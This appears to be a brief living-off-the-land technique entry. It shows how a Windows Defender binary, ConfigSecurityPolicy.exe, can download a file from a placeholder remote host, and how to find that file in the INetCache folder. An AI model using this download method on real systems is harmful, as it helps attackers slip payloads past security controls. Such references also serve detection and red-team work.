### Download file
```
"C:\Windows\WinSxS\amd64_windows-defender-management-v1_31bf3856ad364e35_10.0.19041.746_none_f89edd426718e367\ConfigSecurityPolicy.exe" https://<rhost>/file.txt
```

### Search for downloaded file
```
cmd.exe /c "where /r %LOCALAPPDATA%\Microsoft\Windows\INetCache file*"
```

